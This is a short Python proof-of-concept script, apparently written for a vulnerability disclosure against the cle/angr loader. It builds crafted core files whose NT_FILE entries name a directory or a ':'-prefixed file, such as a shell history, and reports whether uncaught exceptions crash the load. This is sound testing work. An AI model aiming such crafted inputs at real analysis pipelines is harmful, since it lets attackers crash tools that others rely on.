#!/usr/bin/env python3
"""PoC 1c - NT_FILE uncaught-exception crashes (sink S1, see common.py).

Naming a directory, or any ':'-prefixed text file (claimed by the Hex backend,
whose is_compatible is startswith(b":") - e.g. ~/.zsh_history), raises
IsADirectoryError / CLEError out of cle.Loader()/angr.Project() and kills the
whole load. __reload_children's except-clause covers neither.

Expected on vulnerable cle: both exceptions propagate.
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
import cle  # noqa: E402

from lib.builders import build_core  # noqa: E402


def attempt(path, workdir):
    core = os.path.join(workdir, "crash.core")
    build_core([(0x400000, 0x401000, 0, path)], core)
    try:
        cle.Loader(core)
        return None
    except Exception as e:  # noqa: BLE001 - the point is what escapes
        return f"{type(e).__name__}: {e}"


def main():
    print(f"cle {cle.__version__}, {__file__.split('/')[-1]}")
    with tempfile.TemporaryDirectory() as td:
        directory = os.path.join(td, "a_directory")
        os.mkdir(directory)
        colon_file = os.path.join(td, "colon_history")
        with open(colon_file, "w") as f:
            f.write(": 1771592796:0;echo hi\n")

        r1 = attempt(directory, td)
        r2 = attempt(colon_file, td)
        print(f"  directory-named core -> {r1 or 'no exception'}")
        print(f"  ':'-prefixed file core -> {r2 or 'no exception'}")

        ok = r1 is not None and r2 is not None
        print("RESULT:", "VULNERABLE - unhandled exceptions kill the whole load" if ok
              else "NOT REPRODUCIBLE")


if __name__ == "__main__":
    main()
